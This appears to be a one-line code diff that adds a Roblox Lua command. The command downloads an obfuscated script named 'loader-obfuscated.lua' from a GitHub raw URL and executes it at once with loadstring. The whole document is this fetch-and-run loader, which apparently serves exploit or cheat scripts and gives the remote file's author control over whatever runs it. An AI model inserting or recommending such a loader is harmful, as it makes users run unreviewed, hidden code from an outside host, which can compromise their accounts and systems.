@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vouchings/Loader/refs/heads/main/loader-obfuscated.lua'))()
